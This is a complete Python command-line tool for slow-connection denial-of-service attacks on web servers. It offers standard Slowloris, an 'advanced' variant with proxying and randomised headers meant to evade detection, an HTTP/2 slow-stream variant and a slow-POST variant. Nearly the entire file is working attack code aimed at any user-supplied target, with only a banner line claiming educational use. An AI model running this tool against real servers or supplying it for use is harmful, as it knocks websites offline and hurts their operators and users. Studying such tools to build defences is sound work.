#!/usr/bin/env python3

"""
Enhanced Slowloris Attack Module
Multi-threaded HTTP slow header attack with advanced features
"""

import sys
import time
import socket
import random
import threading
import argparse
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

class SlowlorisAttack:
    def __init__(self, target, port=80, duration=60, connections=200, 
                 use_ssl=False, timeout=4, user_agents=None):
        self.target = target
        self.port = port
        self.duration = duration
        self.connections = connections
        self.use_ssl = use_ssl
        self.timeout = timeout
        self.sockets = []
        self.stop_event = threading.Event()
        self.active_connections = 0
        self.total_requests = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
        
        # User agents for better evasion
        self.user_agents = user_agents or [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
    
    def create_socket(self):
        """Create and return a socket connection"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Connect to target
            sock.connect((self.target, self.port))
            
            # Wrap with SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            return sock
        except Exception as e:
            return None
    
    def send_initial_headers(self, sock):
        """Send initial HTTP headers"""
        try:
            # Generate random request path
            random_path = f"/?{random.randint(0, 100000)}"
            
            # Send request line
            request = f"GET {random_path} HTTP/1.1\r\n"
            sock.send(request.encode('utf-8'))
            
            # Send host header
            host_header = f"Host: {self.target}\r\n"
            sock.send(host_header.encode('utf-8'))
            
            # Send random user agent
            user_agent = random.choice(self.user_agents)
            ua_header = f"User-Agent: {user_agent}\r\n"
            sock.send(ua_header.encode('utf-8'))
            
            # Send additional headers
            headers = [
                "Accept-language: en-US,en,q=0.5\r\n",
                "Accept-encoding: gzip\r\n",
                "Cache-Control: no-cache\r\n",
                "Connection: keep-alive\r\n"
            ]
            
            for header in headers:
                sock.send(header.encode('utf-8'))
                time.sleep(0.1)  # Small delay between headers
            
            return True
        except Exception as e:
            return False
    
    def send_keep_alive_header(self, sock):
        """Send keep-alive header to maintain connection"""
        try:
            # Send random header to keep connection alive
            random_header = f"X-a: {random.randint(1, 5000)}\r\n"
            sock.send(random_header.encode('utf-8'))
            return True
        except Exception as e:
            return False
    
    def connection_worker(self, worker_id):
        """Worker thread for managing a single connection"""
        try:
            # Create connection
            sock = self.create_socket()
            if not sock:
                return
            
            # Send initial headers
            if not self.send_initial_headers(sock):
                sock.close()
                return
            
            # Add to active connections
            with self.lock:
                self.active_connections += 1
                self.total_requests += 1
            
            # Keep connection alive
            while not self.stop_event.is_set():
                time.sleep(15)  # Wait before sending keep-alive
                
                if not self.send_keep_alive_header(sock):
                    break
            
            # Close connection
            sock.close()
            with self.lock:
                self.active_connections -= 1
                
        except Exception as e:
            with self.lock:
                if self.active_connections > 0:
                    self.active_connections -= 1
    
    def monitor_attack(self):
        """Monitor attack progress"""
        while not self.stop_event.is_set():
            elapsed = time.time() - self.start_time
            remaining = max(0, self.duration - elapsed)
            
            with self.lock:
                active = self.active_connections
                total = self.total_requests
            
            print(f"\r[SLOWLORIS] Active: {active:3d} | Total: {total:4d} | "
                  f"Elapsed: {elapsed:5.1f}s | Remaining: {remaining:5.1f}s", 
                  end="", flush=True)
            
            time.sleep(1)
    
    def maintain_connections(self):
        """Maintain target number of connections"""
        with ThreadPoolExecutor(max_workers=self.connections) as executor:
            # Submit initial connection workers
            futures = []
            for i in range(self.connections):
                future = executor.submit(self.connection_worker, i)
                futures.append(future)
                time.sleep(0.1)  # Stagger connection attempts
            
            # Monitor and replace dead connections
            while not self.stop_event.is_set():
                time.sleep(5)
                
                # Check for completed futures and restart workers
                completed_futures = []
                for future in futures:
                    if future.done():
                        completed_futures.append(future)
                
                # Remove completed futures and start new workers
                for future in completed_futures:
                    futures.remove(future)
                    if not self.stop_event.is_set():
                        new_future = executor.submit(self.connection_worker, 
                                                   len(futures))
                        futures.append(new_future)
    
    def start_attack(self):
        """Start the Slowloris attack"""
        print(f"\n[PYTHON SLOWLORIS] Starting attack...")
        print(f"Target: {self.target}:{self.port}")
        print(f"SSL: {'Enabled' if self.use_ssl else 'Disabled'}")
        print(f"Duration: {self.duration} seconds")
        print(f"Connections: {self.connections}")
        print(f"Timeout: {self.timeout} seconds\n")
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_attack)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start connection maintenance thread
        maintain_thread = threading.Thread(target=self.maintain_connections)
        maintain_thread.daemon = True
        maintain_thread.start()
        
        # Wait for attack duration
        time.sleep(self.duration)
        
        # Stop attack
        self.stop_event.set()
        
        # Wait for threads to finish
        time.sleep(2)
        
        print(f"\n\n[ATTACK COMPLETED] Slowloris attack finished")
        with self.lock:
            print(f"Total requests sent: {self.total_requests}")


class AdvancedSlowloris(SlowlorisAttack):
    """Advanced Slowloris with additional features"""
    
    def __init__(self, target, port=80, duration=60, connections=200, 
                 use_ssl=False, timeout=4, proxy=None, randomize_headers=True):
        super().__init__(target, port, duration, connections, use_ssl, timeout)
        self.proxy = proxy
        self.randomize_headers = randomize_headers
        
        # Additional headers for randomization
        self.random_headers = [
            "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cache-Control: max-age=0",
            "Pragma: no-cache",
            "If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT",
            "If-None-Match: \"fake\"",
            "X-Requested-With: XMLHttpRequest",
            "X-Forwarded-For: 127.0.0.1",
            "Authorization: Basic dGVzdDp0ZXN0"
        ]
    
    def create_socket(self):
        """Enhanced socket creation with proxy support"""
        try:
            if self.proxy:
                # Basic proxy support
                proxy_host, proxy_port = self.proxy.split(':')
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((proxy_host, int(proxy_port)))
                
                # Send CONNECT request for HTTPS
                if self.use_ssl:
                    connect_req = f"CONNECT {self.target}:{self.port} HTTP/1.1\r\n\r\n"
                    sock.send(connect_req.encode())
                    response = sock.recv(4096)
                    
                    if b"200" not in response:
                        raise Exception("Proxy connection failed")
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target, self.port))
            
            # Apply SSL if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            return sock
        except Exception as e:
            return None
    
    def send_initial_headers(self, sock):
        """Enhanced header sending with randomization"""
        try:
            # Generate random request
            methods = ["GET", "POST", "HEAD"]
            method = random.choice(methods)
            path = f"/{random.choice(['', 'index.html', 'admin', 'login'])}?id={random.randint(1, 1000)}"
            
            # Send request line
            request = f"{method} {path} HTTP/1.1\r\n"
            sock.send(request.encode('utf-8'))
            
            # Send required headers
            sock.send(f"Host: {self.target}\r\n".encode('utf-8'))
            
            # Send user agent
            user_agent = random.choice(self.user_agents)
            sock.send(f"User-Agent: {user_agent}\r\n".encode('utf-8'))
            
            # Send randomized headers if enabled
            if self.randomize_headers:
                num_headers = random.randint(3, 7)
                selected_headers = random.sample(self.random_headers, num_headers)
                
                for header in selected_headers:
                    sock.send(f"{header}\r\n".encode('utf-8'))
                    time.sleep(random.uniform(0.05, 0.2))
            
            # Standard headers
            standard_headers = [
                "Connection: keep-alive\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n"
            ]
            
            for header in standard_headers:
                sock.send(header.encode('utf-8'))
                time.sleep(0.1)
            
            return True
        except Exception as e:
            return False
    
    def send_keep_alive_header(self, sock):
        """Enhanced keep-alive with randomized headers"""
        try:
            # Randomize keep-alive headers
            headers = [
                f"X-{random.choice(['Custom', 'Random', 'Keep', 'Alive'])}: {random.randint(1, 10000)}\r\n",
                f"X-Real-IP: 192.168.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n",
                f"X-Session: {random.randint(100000, 999999)}\r\n",
                f"X-Token: {''.join(random.choices('abcdef0123456789', k=16))}\r\n"
            ]
            
            header = random.choice(headers)
            sock.send(header.encode('utf-8'))
            return True
        except Exception as e:
            return False


def main():
    parser = argparse.ArgumentParser(description="Enhanced Slowloris HTTP Attack Tool")
    parser.add_argument("-t", "--target", required=True, 
                       help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=80, 
                       help="Target port (default: 80)")
    parser.add_argument("-d", "--duration", type=int, default=60, 
                       help="Attack duration in seconds (default: 60)")
    parser.add_argument("-c", "--connections", type=int, default=200, 
                       help="Number of connections (default: 200)")
    parser.add_argument("-s", "--ssl", action="store_true", 
                       help="Use SSL/HTTPS")
    parser.add_argument("-T", "--timeout", type=int, default=4, 
                       help="Socket timeout (default: 4)")
    parser.add_argument("--advanced", action="store_true", 
                       help="Use advanced Slowloris with randomization")
    parser.add_argument("--proxy", type=str, 
                       help="Proxy server (host:port)")
    parser.add_argument("--user-agents", type=str, 
                       help="File containing user agents (one per line)")
    
    args = parser.parse_args()
    
    # Load custom user agents if provided
    user_agents = None
    if args.user_agents:
        try:
            with open(args.user_agents, 'r') as f:
                user_agents = [line.strip() for line in f if line.strip()]
            print(f"Loaded {len(user_agents)} user agents")
        except Exception as e:
            print(f"Error loading user agents: {e}")
            sys.exit(1)
    
    try:
        if args.advanced:
            print("[INFO] Using Advanced Slowloris")
            attack = AdvancedSlowloris(
                target=args.target,
                port=args.port,
                duration=args.duration,
                connections=args.connections,
                use_ssl=args.ssl,
                timeout=args.timeout,
                proxy=args.proxy,
                randomize_headers=True
            )
        else:
            print("[INFO] Using Standard Slowloris")
            attack = SlowlorisAttack(
                target=args.target,
                port=args.port,
                duration=args.duration,
                connections=args.connections,
                use_ssl=args.ssl,
                timeout=args.timeout,
                user_agents=user_agents
            )
        
        # Start the attack
        attack.start_attack()
        
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[ERROR] Attack failed: {e}")
        sys.exit(1)


class SlowlorisHTTP2:
    """HTTP/2 version of Slowloris attack"""
    
    def __init__(self, target, port=443, duration=60, connections=100):
        self.target = target
        self.port = port
        self.duration = duration
        self.connections = connections
        self.stop_event = threading.Event()
        self.active_connections = 0
        self.lock = threading.Lock()
    
    def create_h2_connection(self):
        """Create HTTP/2 connection"""
        try:
            import h2.connection
            import h2.events
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            
            # SSL context for HTTP/2
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2'])
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Connect and wrap with SSL
            sock.connect((self.target, self.port))
            sock = context.wrap_socket(sock, server_hostname=self.target)
            
            # Create HTTP/2 connection
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.send(conn.data_to_send())
            
            return sock, conn
        except ImportError:
            print("[ERROR] h2 library not installed. Install with: pip install h2")
            return None, None
        except Exception as e:
            return None, None
    
    def h2_slow_request(self, worker_id):
        """HTTP/2 slow request worker"""
        try:
            sock, conn = self.create_h2_connection()
            if not sock or not conn:
                return
            
            with self.lock:
                self.active_connections += 1
            
            # Send headers slowly
            headers = [
                (':method', 'GET'),
                (':path', f'/slow{worker_id}'),
                (':scheme', 'https'),
                (':authority', self.target),
                ('user-agent', 'SlowlorisHTTP2/1.0'),
            ]
            
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=False)
            sock.send(conn.data_to_send())
            
            # Keep stream alive
            while not self.stop_event.is_set():
                time.sleep(10)
                try:
                    # Send data frames slowly
                    conn.send_data(stream_id, b'x', end_stream=False)
                    sock.send(conn.data_to_send())
                except:
                    break
            
            sock.close()
            with self.lock:
                self.active_connections -= 1
                
        except Exception as e:
            with self.lock:
                if self.active_connections > 0:
                    self.active_connections -= 1
    
    def start_h2_attack(self):
        """Start HTTP/2 Slowloris attack"""
        print(f"\n[HTTP/2 SLOWLORIS] Starting attack...")
        print(f"Target: {self.target}:{self.port}")
        print(f"Duration: {self.duration} seconds")
        print(f"Connections: {self.connections}\n")
        
        # Start workers
        threads = []
        for i in range(self.connections):
            thread = threading.Thread(target=self.h2_slow_request, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)
        
        # Monitor attack
        start_time = time.time()
        while time.time() - start_time < self.duration:
            elapsed = time.time() - start_time
            remaining = self.duration - elapsed
            
            with self.lock:
                active = self.active_connections
            
            print(f"\r[HTTP/2] Active: {active:3d} | Elapsed: {elapsed:5.1f}s | "
                  f"Remaining: {remaining:5.1f}s", end="", flush=True)
            time.sleep(1)
        
        # Stop attack
        self.stop_event.set()
        print(f"\n[HTTP/2] Attack completed")


class SlowlorisPostData:
    """POST data Slowloris variant"""
    
    def __init__(self, target, port=80, duration=60, connections=150, use_ssl=False):
        self.target = target
        self.port = port
        self.duration = duration
        self.connections = connections
        self.use_ssl = use_ssl
        self.stop_event = threading.Event()
        self.active_connections = 0
        self.lock = threading.Lock()
    
    def slow_post_worker(self, worker_id):
        """Worker for slow POST attack"""
        try:
            # Create connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            with self.lock:
                self.active_connections += 1
            
            # Send POST headers
            content_length = 1000000  # Large content length
            headers = [
                f"POST /login HTTP/1.1\r\n",
                f"Host: {self.target}\r\n",
                f"Content-Type: application/x-www-form-urlencoded\r\n",
                f"Content-Length: {content_length}\r\n",
                f"Connection: keep-alive\r\n",
                f"User-Agent: Mozilla/5.0 SlowPost\r\n",
                f"\r\n"
            ]
            
            for header in headers:
                sock.send(header.encode())
                time.sleep(0.1)
            
            # Send POST data very slowly
            data_sent = 0
            while not self.stop_event.is_set() and data_sent < content_length:
                try:
                    # Send one byte every few seconds
                    sock.send(b"a")
                    data_sent += 1
                    time.sleep(5)
                except:
                    break
            
            sock.close()
            with self.lock:
                self.active_connections -= 1
                
        except Exception as e:
            with self.lock:
                if self.active_connections > 0:
                    self.active_connections -= 1
    
    def start_post_attack(self):
        """Start slow POST attack"""
        print(f"\n[SLOW POST] Starting attack...")
        print(f"Target: {self.target}:{self.port}")
        print(f"SSL: {'Enabled' if self.use_ssl else 'Disabled'}")
        print(f"Duration: {self.duration} seconds")
        print(f"Connections: {self.connections}\n")
        
        # Start workers
        threads = []
        for i in range(self.connections):
            thread = threading.Thread(target=self.slow_post_worker, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)
        
        # Monitor attack
        start_time = time.time()
        while time.time() - start_time < self.duration:
            elapsed = time.time() - start_time
            remaining = self.duration - elapsed
            
            with self.lock:
                active = self.active_connections
            
            print(f"\r[SLOW POST] Active: {active:3d} | Elapsed: {elapsed:5.1f}s | "
                  f"Remaining: {remaining:5.1f}s", end="", flush=True)
            time.sleep(1)
        
        # Stop attack
        self.stop_event.set()
        print(f"\n[SLOW POST] Attack completed")


# Additional utility functions
def test_target_connectivity(target, port, use_ssl=False):
    """Test if target is reachable"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target, port))
        
        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target)
        
        sock.close()
        return True
    except Exception as e:
        return False

def banner():
    """Display banner"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                    Enhanced Slowloris Tool                   ║
║                   Python Implementation                      ║
║                                                              ║
║  [!] Educational and Authorized Testing Only                ║
╚══════════════════════════════════════════════════════════════╝
    """)

# Extended main function with all variants
if __name__ == "__main__":
    banner()
    
    # Add variant selection to argument parser
    parser = argparse.ArgumentParser(description="Enhanced Slowloris HTTP Attack Tool")
    parser.add_argument("-t", "--target", required=True, 
                       help="Target hostname or IP address")
    parser.add_argument("-p", "--port", type=int, default=80, 
                       help="Target port (default: 80)")
    parser.add_argument("-d", "--duration", type=int, default=60, 
                       help="Attack duration in seconds (default: 60)")
    parser.add_argument("-c", "--connections", type=int, default=200, 
                       help="Number of connections (default: 200)")
    parser.add_argument("-s", "--ssl", action="store_true", 
                       help="Use SSL/HTTPS")
    parser.add_argument("-T", "--timeout", type=int, default=4, 
                       help="Socket timeout (default: 4)")
    parser.add_argument("--variant", choices=['standard', 'advanced', 'http2', 'post'], 
                       default='standard', help="Attack variant")
    parser.add_argument("--proxy", type=str, 
                       help="Proxy server (host:port)")
    parser.add_argument("--user-agents", type=str, 
                       help="File containing user agents (one per line)")
    parser.add_argument("--test", action="store_true", 
                       help="Test target connectivity first")
    
    args = parser.parse_args()
    
    # Test connectivity if requested
    if args.test:
        print(f"[TEST] Testing connectivity to {args.target}:{args.port}...")
        if test_target_connectivity(args.target, args.port, args.ssl):
            print("[TEST] ✓ Target is reachable")
        else:
            print("[TEST] ✗ Target is not reachable")
            sys.exit(1)
    
    # Load custom user agents if provided
    user_agents = None
    if args.user_agents:
        try:
            with open(args.user_agents, 'r') as f:
                user_agents = [line.strip() for line in f if line.strip()]
            print(f"[INFO] Loaded {len(user_agents)} user agents")
        except Exception as e:
            print(f"[ERROR] Loading user agents: {e}")
            sys.exit(1)
    
    try:
        # Select attack variant
        if args.variant == 'standard':
            attack = SlowlorisAttack(
                target=args.target,
                port=args.port,
                duration=args.duration,
                connections=args.connections,
                use_ssl=args.ssl,
                timeout=args.timeout,
                user_agents=user_agents
            )
            attack.start_attack()
            
        elif args.variant == 'advanced':
            attack = AdvancedSlowloris(
                target=args.target,
                port=args.port,
                duration=args.duration,
                connections=args.connections,
                use_ssl=args.ssl,
                timeout=args.timeout,
                proxy=args.proxy,
                randomize_headers=True
            )
            attack.start_attack()
            
        elif args.variant == 'http2':
            attack = SlowlorisHTTP2(
                target=args.target,
                port=args.port or 443,
                duration=args.duration,
                connections=args.connections
            )
            attack.start_h2_attack()
            
        elif args.variant == 'post':
            attack = SlowlorisPostData(
                target=args.target,
                port=args.port,
                duration=args.duration,
                connections=args.connections,
                use_ssl=args.ssl
            )
            attack.start_post_attack()
        
    except KeyboardInterrupt:
        print("\n[INFO] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[ERROR] Attack failed: {e}")
        sys.exit(1)

